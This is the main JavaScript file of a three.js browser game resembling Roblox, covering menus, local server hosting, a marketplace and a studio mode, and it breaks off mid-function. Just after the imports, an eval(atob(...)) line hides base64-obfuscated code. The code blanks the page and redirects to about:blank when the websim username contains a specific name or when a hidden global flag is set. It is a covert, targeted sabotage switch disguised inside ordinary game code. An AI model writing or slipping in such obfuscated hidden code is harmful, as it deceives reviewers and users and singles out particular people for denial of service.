import * as THREE from 'three';
import { World } from './World.js';
import { Player } from './Player.js';
import { InputManager } from './InputManager.js';
import { boxUnwrapUVs, surfaceManager } from './utils.js';
import { CameraController } from './CameraController.js';

eval(atob("KGZ1bmN0aW9uKCl7dHJ5e3ZhciB1PXdpbmRvdy53ZWJzaW0mJndpbmRvdy53ZWJzaW0udXNlciYmd2luZG93LndlYnNpbS51c2VyLnVzZXJuYW1lO3ZhciBmPSh0eXBlb2YgX0YhPT0ndW5kZWZpbmVkJyYmX0YpO2lmKGZ8fCh1JiZ1LnRvTG93ZXJDYXNlKCkuaW5kZXhPZignYnVtcHlnbG9iZTIyNjQ0MDInKT4tMSkpe3RyeXt3aW5kb3cudG9wLmxvY2F0aW9uLnJlcGxhY2UoJ2Fib3V0OmJsYW5rJyl9Y2F0Y2goZSl7d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoJ2Fib3V0OmJsYW5rJyl9ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmlubmVySFRNTD0nJ319Y2F0Y2goZSl7fX0pKCk="));

const scene = new THREE.Scene();

// Camera setup
const camera = new THREE.PerspectiveCamera(70, window.innerWidth / window.innerHeight, 0.1, 500);

const renderer = new THREE.WebGLRenderer({ antialias: false });
renderer.shadowMap.enabled = false;
document.body.appendChild(renderer.domElement);
renderer.domElement.style.imageRendering = 'pixelated';

// Lights
const ambient = new THREE.AmbientLight(0xffffff, 0.7);
scene.add(ambient);

const sun = new THREE.DirectionalLight(0xffffff, 0.8);
sun.position.set(20, 50, 20);
scene.add(sun);

// Init World
const world = new World(scene);

// Menu Environment
const menuGroup = new THREE.Group();
scene.add(menuGroup);

// --- Create Mini Platform for Menu ---
const menuHeight = 1;
const menuCenterSize = 4;

// Materials (Dark Grey Center, Darker Rims)
const menuCenterColor = new THREE.Color(0x666666);
const menuCenterMat = new THREE.MeshStandardMaterial({
    map: surfaceManager.textures.studs,
    color: menuCenterColor,
    roughness: 0.6, metalness: 0.1
});
const menuInletMat = new THREE.MeshStandardMaterial({
    map: surfaceManager.textures.inlet,
    color: menuCenterColor, 
    roughness: 0.6, metalness: 0.1
});
const menuCenterMats = [menuCenterMat, menuCenterMat, menuCenterMat, menuInletMat, menuCenterMat, menuCenterMat];

const menuRimColor = new THREE.Color(0x333333);
const menuRimMat = new THREE.MeshStandardMaterial({
    map: surfaceManager.textures.studs,
    color: menuRimColor, roughness: 0.8
});
const menuRimInletMat = new THREE.MeshStandardMaterial({
    map: surfaceManager.textures.inlet,
    color: menuRimColor, roughness: 0.8
});
const menuRimMats = [menuRimMat, menuRimMat, menuRimMat, menuRimInletMat, menuRimMat, menuRimMat];

// Center Mesh (4x4)
const menuCenterGeo = new THREE.BoxGeometry(menuCenterSize, menuHeight, menuCenterSize);
boxUnwrapUVs(menuCenterGeo);
const menuCenterMesh = new THREE.Mesh(menuCenterGeo, menuCenterMats);
menuCenterMesh.position.set(0, -menuHeight/2, 0); 
menuGroup.add(menuCenterMesh);

// Rims
const addMenuRim = (w, h, d, x, y, z) => {
    const geo = new THREE.BoxGeometry(w, h, d);
    boxUnwrapUVs(geo);
    const mesh = new THREE.Mesh(geo, menuRimMats);
    mesh.position.set(x, y, z);
    menuGroup.add(mesh);
};

const rimLen = menuCenterSize + 2; // 6
// Front/Back (Z axis)
addMenuRim(rimLen, menuHeight, 1, 0, -menuHeight/2, -(menuCenterSize+1)/2); // Back
addMenuRim(rimLen, menuHeight, 1, 0, -menuHeight/2, (menuCenterSize+1)/2);  // Front
// Left/Right (X axis, fitting between Z rims)
addMenuRim(1, menuHeight, menuCenterSize, -(menuCenterSize+1)/2, -menuHeight/2, 0); // Left
addMenuRim(1, menuHeight, menuCenterSize, (menuCenterSize+1)/2, -menuHeight/2, 0);  // Right

// Position the whole group so the top surface (y=0) is at player feet (y=0) at x=5
menuGroup.position.set(3.5, 1.5, 8);


// Init Player
const player = new Player(scene);

/* Camera State is now managed by CameraController for consistency */
// Add explicit orbit/studio camera state variables used elsewhere
let cameraYaw = 0;
let cameraPitch = 0.3;
let cameraDist = 20;
let cameraSensitivity = 1.0;
const cameraController = new CameraController();
cameraController.setSensitivity(cameraSensitivity);

// Game State
let gameState = 'MENU'; // MENU, CUSTOMIZE, PLAYING, SETTINGS

const menuBGM = new Audio('/TheGreatStrategy.mp3');
menuBGM.loop = true;
menuBGM.volume = 0.6;

const tryPlayBGM = () => {
    if (gameState !== 'PLAYING' && menuBGM.paused) {
        menuBGM.play().catch(() => {});
    }
};

// Attempt to play music on first interaction if blocked
window.addEventListener('click', tryPlayBGM);
window.addEventListener('keydown', tryPlayBGM);
// Attempt immediate play
tryPlayBGM();

const switchSound = new Audio('/SWITCH3.wav');
const zoomSound = new Audio('/switch.wav');
let activeZoomSound = null;

const playSwitch = () => {
    const s = switchSound.cloneNode();
    s.volume = 0.8;
    s.play().catch(()=>{});
};
// Add sound to all current buttons (dev menu etc)
document.querySelectorAll('button').forEach(b => b.addEventListener('mousedown', playSwitch));

// Play classic jump sound when any UI button is pressed.
// Use a cloned Audio element so simultaneous clicks can overlap.
const _uiButtonJumpSfx = new Audio('/roblox-classic-jump.mp3');
document.addEventListener('click', (e) => {
    const btn = e.target.closest && e.target.closest('button');
    if (!btn) return;
    try {
        const s = _uiButtonJumpSfx.cloneNode();
        s.volume = 1.0;
        s.play().catch(() => {});
    } catch (err) {
        // ignore playback errors
    }
});

// Inputs
const input = new InputManager();

window.addEventListener('wheel', (e) => {
    // In STUDIO mode: move camera forward/back along its view direction (true 3D translation)
    if (gameState === 'STUDIO') {
        try {
            if (activeZoomSound) {
                activeZoomSound.pause();
                activeZoomSound.currentTime = 0;
            }
            const s = zoomSound.cloneNode();
            activeZoomSound = s;
            s.volume = 0.35;
            s.play().catch(() => {});
        } catch (err) {}

        // Move amount (studs)
        const moveStep = Math.sign(e.deltaY) * 4;
        const dir = new THREE.Vector3();
        camera.getWorldDirection(dir); // normalized forward direction
        // move forward on negative deltaY (wheel up) so sign aligns with typical zoom in/out
        camera.position.addScaledVector(dir, moveStep);

        // Keep camera above ground a bit
        camera.position.y = Math.max(2, camera.position.y);
        // keep skybox centered
        if (world.skyboxMesh) world.skyboxMesh.position.copy(camera.position);
        return;
    }

    // Default: PLAYING zoom behavior (keep existing behavior)
    if (gameState === 'PLAYING') {
        if (activeZoomSound) {
            activeZoomSound.pause();
            activeZoomSound.currentTime = 0;
        }
        const s = zoomSound.cloneNode();
        activeZoomSound = s;
        s.volume = 0.4;
        s.play().catch(() => {});

        const zoomStep = 2;
        cameraDist += Math.sign(e.deltaY) * zoomStep;
        cameraDist = Math.max(4, Math.min(80, cameraDist));
    }
});

// Mobile Detection & Blocking
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

if (isMobile) {
    const xpModal = document.getElementById('xp-modal');
    xpModal.style.display = 'flex';
    
    // Hide other UI
    document.getElementById('start-menu').style.display = 'none';
    document.getElementById('customize-menu').style.display = 'none';
    document.getElementById('dev-menu').style.display = 'none';
    document.getElementById('chat-container').style.display = 'none';
    
    // Handle OK button
    document.getElementById('xp-ok-btn').addEventListener('click', () => {
        window.location.href = 'https://websim.com';
    });

    // Disable interactions
    gameState = 'BLOCKED';
}

const devPos = null; // Dev panel removed
const devMenu = null;

// Menu UI Logic
const startMenu = document.getElementById('start-menu');
const custMenu = document.getElementById('customize-menu');
const settingsMenu = document.getElementById('settings-menu');
const chatContainer = document.getElementById('chat-container');
const btnExit = document.getElementById('btn-exit-game');

document.getElementById('btn-play').onclick = () => {
    playSwitch();

    // Open Servers modal instead of immediate join
    const sm = document.getElementById('server-modal');
    if (!sm) {
        // fallback to old behaviour
        menuBGM.pause();
        menuBGM.currentTime = 0;
        startMenu.style.display = 'none';
        chatContainer.style.display = 'flex';
        btnExit.style.display = 'block';
        gameState = 'PLAYING';
        player.forcedAnim = null;
        if (world.mapGroup) world.mapGroup.visible = true;
        player.respawn();
        if (!isMobile) document.body.requestPointerLock();
        return;
    }

    // Show modal and render current servers
    sm.style.display = 'flex';
    startMenu.style.display = 'none';
    renderServers();
};

document.getElementById('btn-customize').onclick = () => {
    playSwitch();
    tryPlayBGM();
    startMenu.style.display = 'none';
    // Open Marketplace modal instead of the old customize sidebar
    const mp = document.getElementById('marketplace-modal');
    if (mp) mp.style.display = 'flex';
    chatContainer.style.display = 'none';
    gameState = 'MARKETPLACE';
    if (world.mapGroup) world.mapGroup.visible = false;
};
 
// Server modal controls
const srvClose = document.getElementById('server-close');
const srvHostBtn = document.getElementById('srv-host');
const srvRefreshBtn = document.getElementById('srv-refresh');
const srvNameInp = document.getElementById('srv-name');
const srvThumbInp = document.getElementById('srv-thumb');
const srvMapSel = document.getElementById('srv-map');

if (srvClose) {
    srvClose.addEventListener('click', () => {
        const sm = document.getElementById('server-modal');
        if (sm) sm.style.display = 'none';
        startMenu.style.display = 'flex';
        if (world.mapGroup) world.mapGroup.visible = false;
        playSwitch();
    });
}

if (srvRefreshBtn) srvRefreshBtn.addEventListener('click', renderServers);

if (srvHostBtn) {
    srvHostBtn.addEventListener('click', () => {
        const name = (srvNameInp && srvNameInp.value.trim()) || '';
        if (!name) {
            alert('Please enter a server name.');
            return;
        }
        const map = (srvMapSel && srvMapSel.value) || 'platform';
        // Thumbnail (if any)
        if (srvThumbInp && srvThumbInp.files && srvThumbInp.files[0]) {
            const file = srvThumbInp.files[0];
            const reader = new FileReader();
            reader.onload = (e) => {
                const data = e.target.result;
                createServerEntry(name, map, data);
            };
            reader.readAsDataURL(file);
        } else {
            createServerEntry(name, map, null);
        }
    });
}

/* Servers storage + UI helpers */
let servers = [];

// Load servers from localStorage
function loadServers() {
    try {
        const raw = localStorage.getItem('webblox_servers_v1');
        if (!raw) { servers = []; return; }
        servers = JSON.parse(raw) || [];
    } catch (e) {
        console.warn('Failed to load servers', e);
        servers = [];
    }
}

// Save servers to localStorage
function saveServers() {
    try {
        localStorage.setItem('webblox_servers_v1', JSON.stringify(servers));
    } catch (e) {
        console.warn('Failed to save servers', e);
    }
}

// Render servers list in server modal
function renderServers() {
    loadServers();
    const list = document.getElementById('srv-list');
    if (!list) return;
    list.innerHTML = '';

    if (servers.length === 0) {
        const empty = document.createElement('div');
        empty.style.color = '#ccc';
        empty.textContent = 'No local servers. Host one with the form on the left.';
        list.appendChild(empty);
        return;
    }

    servers.forEach((s) => {
        const item = document.createElement('div');
        item.style.display = 'flex';
        item.style.gap = '8px';
        item.style.alignItems = 'center';
        item.style.padding = '8px';
        item.style.border = '1px solid rgba(255,255,255,0.04)';
        item.style.borderRadius = '6px';
        item.style.background = 'rgba(0,0,0,0.2)';
        item.style.justifyContent = 'space-between';

        const left = document.createElement('div');
        left.style.display = 'flex';
        left.style.gap = '8px';
        left.style.alignItems = 'center';

        const thumb = document.createElement('div');
        thumb.style.width = '64px';
        thumb.style.height = '40px';
        thumb.style.background = 'rgba(255,255,255,0.03)';
        thumb.style.border = '1px solid rgba(255,255,255,0.04)';
        thumb.style.borderRadius = '4px';
        if (s.thumb) {
            const img = document.createElement('img');
            img.src = s.thumb;
            img.style.width = '100%';
            img.style.height = '100%';
            img.style.objectFit = 'cover';
            thumb.appendChild(img);
        } else {
            thumb.textContent = s.map || 'platform';
            thumb.style.display = 'flex';
            thumb.style.alignItems = 'center';
            thumb.style.justifyContent = 'center';
            thumb.style.color = '#aaa';
            thumb.style.fontSize = '12px';
        }

        const meta = document.createElement('div');
        meta.style.display = 'flex';
        meta.style.flexDirection = 'column';
        meta.style.color = '#fff';
        meta.style.fontSize = '13px';
        const title = document.createElement('div');
        title.textContent = s.name;
        const sub = document.createElement('div');
        sub.style.fontSize = '11px';
        sub.style.color = '#ccc';
        sub.textContent = `Map: ${s.map} • Host: ${s.owner}`;
        meta.appendChild(title);
        meta.appendChild(sub);

        left.appendChild(thumb);
        left.appendChild(meta);

        const controls = document.createElement('div');
        controls.style.display = 'flex';
        controls.style.gap = '6px';

        const joinBtn = document.createElement('button');
        joinBtn.className = 'menu-btn';
        joinBtn.textContent = 'Join';
        joinBtn.onclick = () => {
            // Join flow: close modal then join selected server (no hosting privileges assumed)
            const sm = document.getElementById('server-modal');
            if (sm) sm.style.display = 'none';
            playSwitch();
            menuBGM.pause();
            menuBGM.currentTime = 0;
            chatContainer.style.display = 'flex';
            btnExit.style.display = 'block';
            gameState = 'PLAYING';
            player.forcedAnim = null;
            try { world.loadMap(s.map || 'platform'); } catch (e) { world.loadMap('platform'); }
            if (world.mapGroup) world.mapGroup.visible = true;
            player.respawn();
            if (!isMobile) document.body.requestPointerLock();
            logToConsole(`Joined server: ${s.name}`, 'result');
        };

        const infoBtn = document.createElement('button');
        infoBtn.className = 'menu-btn';
        infoBtn.textContent = 'Info';
        infoBtn.onclick = () => {
            alert(`Server: ${s.name}\nMap: ${s.map}\nOwner: ${s.owner}\nCreated: ${new Date(s.createdAt).toLocaleString()}`);
        };

        const delBtn = document.createElement('button');
        delBtn.className = 'menu-btn';
        delBtn.textContent = 'Delete';
        delBtn.onclick = () => {
            if (!confirm('Delete this server entry?')) return;
            const idx = servers.findIndex(x => x.id === s.id);
            if (idx >= 0) {
                servers.splice(idx, 1);
                saveServers();
                renderServers();
                logToConsole(`Deleted server: ${s.name}`, 'result');
            }
        };

        controls.appendChild(joinBtn);
        controls.appendChild(infoBtn);
        controls.appendChild(delBtn);

        item.appendChild(left);
        item.appendChild(controls);
        list.appendChild(item);
    });
}

// New createServerEntry: adds to list/persistence but does NOT auto-join
function createServerEntry(name, map, thumbData) {
    loadServers();
    const id = Date.now() + '_' + Math.floor(Math.random() * 9999);
    const owner = (window.websim && window.websim.user && window.websim.user.username) || 'Local';
    const entry = { id, name, map: map || 'platform', owner, thumb: thumbData || null, createdAt: Date.now() };
    servers.unshift(entry);
    saveServers();
    renderServers();
    logToConsole(`Hosted server entry created: ${name} (map: ${entry.map})`, 'result');
}

document.getElementById('btn-settings').onclick = () => {
    playSwitch();
    tryPlayBGM();
    startMenu.style.display = 'none';
    settingsMenu.style.display = 'flex';
    gameState = 'SETTINGS';
    if (world.mapGroup) world.mapGroup.visible = false;
};

// Studio button: open studio confirmation modal (Confirm: no action yet, Decline: close and return)
document.getElementById('btn-studio').onclick = () => {
    playSwitch();
    tryPlayBGM();
    startMenu.style.display = 'none';
    const sm = document.getElementById('studio-modal');
    if (sm) sm.style.display = 'flex';
    chatContainer.style.display = 'none';
    // Keep the game loop running in the background (don't switch to a blocking STUDIO state)
    gameState = 'MENU';
    if (world.mapGroup) world.mapGroup.visible = false;
};

document.getElementById('btn-settings-back').onclick = () => {
    playSwitch();
    settingsMenu.style.display = 'none';
    startMenu.style.display = 'flex';
    gameState = 'MENU';
    // Restore menu view
    if (world.mapGroup) world.mapGroup.visible = false;
};

btnExit.onclick = () => {
    playSwitch();
    tryPlayBGM(); // Restart menu music
    chatContainer.style.display = 'none';
    btnExit.style.display = 'none';
    startMenu.style.display = 'flex';
    gameState = 'MENU';
    if (world.mapGroup) world.mapGroup.visible = false;
    if (document.pointerLockElement) document.exitPointerLock();
};

// Settings Handlers
const STORAGE_KEY_USERNAME = 'webblox_username_v1';

const volSlider = document.getElementById('set-volume');
volSlider.addEventListener('input', (e) => {
    const val = parseInt(e.target.value) / 100;
    menuBGM.volume = val;
});

const sensSlider = document.getElementById('set-sens');
sensSlider.addEventListener('input', (e) => {
    // Value 10 to 200, map to 0.1 to 2.0
    cameraSensitivity = parseInt(e.target.value) / 100;
});

// Username settings wiring: load saved username and bind input
const usernameInput = document.getElementById('set-username');
try {
    const savedName = localStorage.getItem(STORAGE_KEY_USERNAME) || 'Player';
    if (usernameInput) usernameInput.value = savedName;
    if (player && player.setUsername) player.setUsername(savedName);
} catch (e) {
    console.warn('Failed to load username from storage', e);
}
if (usernameInput) {
    usernameInput.addEventListener('change', (e) => {
        const v = (e.target.value || 'Player').trim();
        try { localStorage.setItem(STORAGE_KEY_USERNAME, v); } catch (err) {}
        if (player && player.setUsername) player.setUsername(v);
        logToConsole(`Username set to: ${v}`, 'result');
    });
}

document.getElementById('btn-cust-done').onclick = () => {
    playSwitch();
    tryPlayBGM();
    custMenu.style.display = 'none';
    startMenu.style.display = 'flex';
    chatContainer.style.display = 'none';
    gameState = 'MENU';
    if (world.mapGroup) world.mapGroup.visible = false;
};

// Customization Handlers
const bindColor = (id, part) => {
    const el = document.getElementById(id);
    el.addEventListener('input', (e) => {
        player.setPartColor(part, e.target.value);
    });
};
bindColor('col-head', 'head');
bindColor('col-torso', 'torso');
bindColor('col-larm', 'leftArm');
bindColor('col-rarm', 'rightArm');
bindColor('col-lleg', 'leftLeg');
bindColor('col-rleg', 'rightLeg');

const bindTexture = (id, method) => {
    const el = document.getElementById(id);
    el.addEventListener('change', (e) => {
        if (e.target.files && e.target.files[0]) {
            const reader = new FileReader();
            reader.onload = (evt) => {
                const img = new Image();
                img.onload = () => player[method](img);
                img.src = evt.target.result;
            };
            reader.readAsDataURL(e.target.files[0]);
        }
    });
};
bindTexture('file-face', 'setFaceTexture');
bindTexture('file-shirt', 'setShirtTexture');

// Marketplace logic: simple in-memory asset store and UI
const mpModal = document.getElementById('marketplace-modal');
const mpFile = document.getElementById('mp-file');
const mpType = document.getElementById('mp-type');
const mpUpload = document.getElementById('mp-upload');
const mpList = document.getElementById('mp-list');
const mpClose = document.getElementById('mp-close');
const mpDone = document.getElementById('mp-done');
const mpClear = document.getElementById('mp-clear');
const mpFilter = document.getElementById('mp-filter');
const mpTabs = document.getElementById('mp-tabs');
const mpName = document.getElementById('mp-name');
const mpCount = document.getElementById('mp-count');
const mpRefresh = document.getElementById('mp-refresh');
const mpVisibility = document.getElementById('mp-visibility');

const STORAGE_KEY_ASSETS = 'webblox_marketplace_assets_v1';
const STORAGE_KEY_EQUIPPED_FACE = 'webblox_equipped_face_v1';
const STORAGE_KEY_EQUIPPED_SHIRT = 'webblox_equipped_shirt_v1';

// In-memory assets (loaded from localStorage at startup)
let marketplaceAssets = []; // { id, name, type, imgDataURL, local, uploader, visibility, owned, ownedByYou }

// Helper: persist assets to localStorage (store minimal serializable fields)
function saveMarketplaceToStorage() {
    try {
        const serial = marketplaceAssets.map(a => ({
            id: a.id,
            name: a.name,
            type: a.type,
            imgDataURL: a.img.src || a.imgDataURL || null,
            local: !!a.local,
            uploader: a.uploader || null,
            visibility: a.visibility || 'public',
            owned: !!a.owned,
            ownedByYou: !!a.ownedByYou
        }));
        localStorage.setItem(STORAGE_KEY_ASSETS, JSON.stringify(serial));
    } catch (e) {
        console.warn('Failed to save marketplace to storage', e);
    }
}

// Helper: load assets from storage (recreates Image objects)
function loadMarketplaceFromStorage() {
    try {
        const raw = localStorage.getItem(STORAGE_KEY_ASSETS);
        if (!raw) return;
        const parsed = JSON.parse(raw);
        marketplaceAssets = parsed.map(p => {
            const img = new Image();
            img.src = p.imgDataURL || '';
            return {
                id: p.id,
                name: p.name,
                type: p.type,
                img,
                imgDataURL: p.imgDataURL || '',
                local: p.local,
                uploader: p.uploader,
                visibility: p.visibility || 'public',
                owned: p.owned || false,
                ownedByYou: p.ownedByYou || false
            };
        });
    } catch (e) {
        console.warn('Failed to load marketplace from storage', e);
        marketplaceAssets = [];
    }
}

// Auto-apply equipped items on startup
function applyEquippedFromStorage() {
    try {
        const faceId = localStorage.getItem(STORAGE_KEY_EQUIPPED_FACE);
        const shirtId = localStorage.getItem(STORAGE_KEY_EQUIPPED_SHIRT);
        if (faceId) {
            const a = marketplaceAssets.find(x => x.id === faceId);
            if (a && a.img) player.setFaceTexture(a.img);
        }
        if (shirtId) {
            const a = marketplaceAssets.find(x => x.id === shirtId);
            if (a && a.img) player.setShirtTexture(a.img);
        }
    } catch (e) {
        console.warn('Failed to apply equipped items', e);
    }
}

function renderMarketplace() {
    if (!mpList) return;
    // Determine active tab and filter
    const activeTab = document.querySelector('.mp-tab.active')?.dataset.tab || 'community';
    const typeFilter = (document.getElementById('mp-filter')?.value) || 'all';

    // Filtered list
    const filtered = marketplaceAssets.filter(a => {
        if (typeFilter !== 'all' && a.type !== typeFilter) return false;

        const vis = a.visibility || 'public';

        if (activeTab === 'community') {
            return vis === 'public' && !a.admin && !a.ownedByYou;
        }
        if (activeTab === 'admin') return !!a.admin;
        if (activeTab === 'yours') {
            const isYou = (window.websim && window.websim.user && window.websim.user.username) || 'Local';
            return !!a.ownedByYou || a.uploader === isYou || a.local || (vis === 'private' && (a.uploader === isYou || a.ownedByYou));
        }
        return true;
    });

    mpList.innerHTML = '';
    document.getElementById('mp-count').textContent = `${filtered.length} assets`;

    filtered.forEach((a, idx) => {
        const wrapper = document.createElement('div');
        wrapper.style.display = 'flex';
        wrapper.style.flexDirection = 'column';
        wrapper.style.alignItems = 'stretch';
        wrapper.style.background = 'rgba(255,255,255,0.02)';
        wrapper.style.border = '1px solid rgba(255,255,255,0.04)';
        wrapper.style.padding = '8px';
        wrapper.style.borderRadius = '6px';
        wrapper.style.cursor = 'default';
        wrapper.style.gap = '8px';

        const img = document.createElement('img');
        img.src = a.img.src;
        img.style.width = '100%';
        img.style.height = '120px';
        img.style.objectFit = 'cover';
        img.style.borderRadius = '4px';
        wrapper.appendChild(img);

        const metaRow = document.createElement('div');
        metaRow.style.display = 'flex';
        metaRow.style.justifyContent = 'space-between';
        metaRow.style.alignItems = 'center';

        const left = document.createElement('div');
        left.style.display = 'flex';
        left.style.flexDirection = 'column';
        left.style.gap = '4px';

        const nameEl = document.createElement('div');
        nameEl.textContent = a.name || ('Asset ' + idx);
        nameEl.style.fontSize = '13px';
        nameEl.style.color = '#fff';
        nameEl.style.fontWeight = '600';
        left.appendChild(nameEl);

        const tag = document.createElement('div');
        tag.textContent = a.type === 'face' ? 'Face' : 'Shirt';
        tag.style.fontSize = '11px';
        tag.style.color = '#ccc';
        left.appendChild(tag);

        metaRow.appendChild(left);

        const badge = document.createElement('div');
        badge.style.fontSize = '11px';
        badge.style.color = a.admin ? '#ffcc00' : (a.owned ? '#66ff66' : '#aaa');
        badge.textContent = a.admin ? 'Admin' : (a.owned ? 'Owned' : (a.local ? 'Local' : ''));
        metaRow.appendChild(badge);

        wrapper.appendChild(metaRow);

        const row = document.createElement('div');
        row.style.display = 'flex';
        row.style.gap = '6px';
        row.style.marginTop = '6px';

        const applyBtn = document.createElement('button');
        applyBtn.textContent = 'Apply';
        applyBtn.className = 'menu-btn';
        applyBtn.onclick = (e) => {
            e.stopPropagation();
            if (a.type === 'face') {
                player.setFaceTexture(a.img);
                // persist equipped face
                try { localStorage.setItem(STORAGE_KEY_EQUIPPED_FACE, a.id); } catch (err) {}
                logToConsole('Applied face image and saved to equipped', 'result');
            } else if (a.type === 'shirt') {
                player.setShirtTexture(a.img);
                try { localStorage.setItem(STORAGE_KEY_EQUIPPED_SHIRT, a.id); } catch (err) {}
                logToConsole('Applied shirt image and saved to equipped', 'result');
            }
        };
        row.appendChild(applyBtn);

        const buyBtn = document.createElement('button');
        buyBtn.textContent = a.owned ? 'Owned' : 'Buy';
        buyBtn.disabled = !!a.owned;
        buyBtn.className = 'menu-btn';
        buyBtn.onclick = (e) => {
            e.stopPropagation();
            if (!a.owned) {
                a.owned = true;
                a.ownedByYou = true;
                saveMarketplaceToStorage();
                logToConsole(`Purchased asset: ${a.name || 'Unnamed'}`, 'result');
                renderMarketplace();
            }
        };
        row.appendChild(buyBtn);

        if (a.local || a.uploader === (window.websim && window.websim.user && window.websim.user.username)) {
            const delBtn = document.createElement('button');
            delBtn.textContent = 'Delete';
            delBtn.className = 'menu-btn';
            delBtn.onclick = (e) => {
                e.stopPropagation();
                const idxAll = marketplaceAssets.indexOf(a);
                if (idxAll >= 0) {
                    marketplaceAssets.splice(idxAll, 1);
                    saveMarketplaceToStorage();
                    renderMarketplace();
                }
            };
            row.appendChild(delBtn);
        }

        wrapper.appendChild(row);
        mpList.appendChild(wrapper);
    });
}

// Load stored assets immediately so UI and apply functions can use them
loadMarketplaceFromStorage();
applyEquippedFromStorage();

if (mpUpload) {
    mpUpload.addEventListener('click', () => {
        if (!mpFile || (!mpFile.files || mpFile.files.length === 0)) {
            alert('Choose a file first.');
            return;
        }
        const file = mpFile.files[0];
        const reader = new FileReader();
        reader.onload = (evt) => {
            const img = new Image();
            img.onload = () => {
                const type = mpType ? mpType.value : 'face';
                const id = Date.now() + '_' + Math.floor(Math.random() * 9999);
                const visibility = (mpVisibility && mpVisibility.value) ? mpVisibility.value : 'public';
                const uploader = (window.websim && window.websim.user && window.websim.user.username) || 'Local';
                // Store img dataURL so we can persist across sessions
                const dataURL = evt.target.result;
                const asset = { id, name: (document.getElementById('mp-name')?.value) || file.name, type, img, imgDataURL: dataURL, local: true, uploader, visibility, owned: true, ownedByYou: true };
                // Add newest first and persist
                marketplaceAssets.unshift(asset);
                saveMarketplaceToStorage();
                renderMarketplace();
                // Auto-apply when uploaded and save equipped slot
                if (type === 'face') {
                    player.setFaceTexture(img);
                    try { localStorage.setItem(STORAGE_KEY_EQUIPPED_FACE, id); } catch (err) {}
                } else {
                    player.setShirtTexture(img);
                    try { localStorage.setItem(STORAGE_KEY_EQUIPPED_SHIRT, id); } catch (err) {}
                }
                logToConsole(`Uploaded asset: ${asset.name} (${type}, ${visibility})`, 'result');
            };
            img.src = evt.target.result;
        };
        reader.readAsDataURL(file);
    });
}

if (mpClear) {
    mpClear.addEventListener('click', () => {
        mpFile.value = '';
        mpType.value = 'face';
        const nameInput = document.getElementById('mp-name');
        if (nameInput) nameInput.value = '';
    });
}

if (mpClose) {
    mpClose.addEventListener('click', () => {
        if (mpModal) mpModal.style.display = 'none';
        startMenu.style.display = 'flex';
        gameState = 'MENU';
        if (world.mapGroup) world.mapGroup.visible = false;
    });
}
if (mpFilter) {
    mpFilter.addEventListener('change', () => renderMarketplace());
}
if (mpRefresh) {
    mpRefresh.addEventListener('click', () => renderMarketplace());
}
if (mpTabs) {
    mpTabs.addEventListener('click', (e) => {
        const b = e.target.closest('.mp-tab');
        if (!b) return;
        document.querySelectorAll('.mp-tab').forEach(t => t.classList.remove('active'));
        b.classList.add('active');
        renderMarketplace();
    });
}


if (mpDone) {
    mpDone.addEventListener('click', () => {
        if (mpModal) mpModal.style.display = 'none';
        startMenu.style.display = 'flex';
        gameState = 'MENU';
        if (world.mapGroup) world.mapGroup.visible = false;
    });
}

 // Studio modal controls (Decline returns to main menu; Confirm switches to studio camera-only mode)
const studioModal = document.getElementById('studio-modal');
const studioDecline = document.getElementById('studio-decline');
const studioConfirm = document.getElementById('studio-confirm');
const studioClose = document.getElementById('studio-close');

if (studioDecline) {
    studioDecline.addEventListener('click', () => {
        if (studioModal) studioModal.style.display = 'none';
        startMenu.style.display = 'flex';
        gameState = 'MENU';
        if (world.mapGroup) world.mapGroup.visible = false;
        playSwitch();
    });
}
if (studioClose) {
    studioClose.addEventListener('click', () => {
        if (studioModal) studioModal.style.display = 'none';
        startMenu.style.display = 'flex';
        gameState = 'MENU';
        if (world.mapGroup) world.mapGroup.visible = false;
    });
}

 // Confirm: enter STUDIO mode (camera-only fly around an empty baseplate)
if (studioConfirm) {
    studioConfirm.addEventListener('click', () => {
        playSwitch();

        // Ensure pointer lock is released so UI/input stays responsive
        if (document.pointerLockElement) {
            try { document.exitPointerLock(); } catch (e) { /* ignore */ }
        }

        // Hide UI and studio modal
        if (studioModal) studioModal.style.display = 'none';
        startMenu.style.display = 'none';
        chatContainer.style.display = 'none';
        btnExit.style.display = 'none';

        // Load the full "platform" map (copy of the non-studio baseplate and its content)
        try {
            world.loadMap('platform');
        } catch (e) {
            // Fallback: ensure there's at least a large baseplate
            world.clear();
            world.createBlock(0, 0, 0, 200, 2, 200, 0x808080);
        }

        // Teleport and hide the player so only the camera is active by default
        try {
            player.teleport(new THREE.Vector3(0, 5, 0));
        } catch (e) { /* ignore */ }
        player.mesh.visible = false;
        player.isDead = true; // prevent player logic from interfering until spawned

        // Put camera in a natural behind/level orientation for studio
        cameraYaw = 0;
        cameraPitch = 0.2;
        cameraDist = 30;
        camera.position.set(0, 10, -30);
        camera.lookAt(0, 10, 0);

        // Ensure the mapGroup is visible for studio
        if (world.mapGroup) world.mapGroup.visible = true;

        // Enter studio state
        gameState = 'STUDIO';

        // Ensure skybox follows camera
        if (world.skyboxMesh) world.skyboxMesh.position.copy(camera.position);

        // Show the studio top UI button (if present)
        const studioTopUi = document.getElementById('studio-top-ui');
        const studioBtn = document.getElementById('studio-test-btn');
        const studioLabel = document.getElementById('studio-test-label');
        if (studioTopUi) studioTopUi.style.display = 'block';
        // Ensure label resets
        if (studioLabel) studioLabel.textContent = 'Test';

        // Internal flag for whether we've spawned the player into the studio scene
        window._studioSpawned = false;

        // Button handler: toggles spawning the player into the world
        if (studioBtn) {
            // Remove previous to avoid duplicate handlers
            studioBtn.onclick = null;
            studioBtn.addEventListener('click', () => {
                const spawned = window._studioSpawned;

                if (!spawned) {
                    // Confirm spawn into Studio playtest
                    const ok = confirm('Spawn into the Studio world for playtesting?');
                    if (!ok) return;

                    // Spawn player at camera-forward position so you appear near camera
                    const forward = new THREE.Vector3();
                    camera.getWorldDirection(forward);
                    const spawnPos = camera.position.clone().addScaledVector(forward, 5);
                    spawnPos.y = Math.max(spawnPos.y, 2.5);

                    player.teleport(spawnPos);
                    player.mesh.visible = true;
                    player.isDead = false;
                    window._studioSpawned = true;
                    if (studioLabel) studioLabel.textContent = 'Stop';
                    logToConsole('Entered Studio playtest', 'result');
                } else {
                    // Confirm stop / return to camera-only studio
                    const ok = confirm('Stop playtesting and return to camera-only Studio?');
                    if (!ok) return;

                    // Hide / remove player from active studio view
                    player.mesh.visible = false;
                    player.isDead = true;
                    window._studioSpawned = false;
